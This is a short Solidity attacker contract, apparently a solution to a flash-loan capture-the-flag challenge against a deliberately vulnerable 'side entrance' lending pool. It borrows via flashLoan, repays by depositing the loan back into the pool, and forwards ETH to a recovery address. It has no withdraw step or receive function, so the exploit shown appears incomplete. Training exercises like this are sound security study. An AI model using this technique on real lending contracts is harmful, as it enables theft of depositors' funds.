// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {
    SideEntranceLenderPool
} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract AttackerCode {
    SideEntranceLenderPool pool;
    function takeLoan(SideEntranceLenderPool _pool, uint256 amount) public {
        pool = _pool;
        pool.flashLoan(amount);
    }
    function execute() public {
        pool.deposit{value: msg.value}();
    }
    function recover(address recovery, uint256 amount) public {
        (bool success, ) = payable(recovery).call{value: amount}("");
        require(success);
    }
}
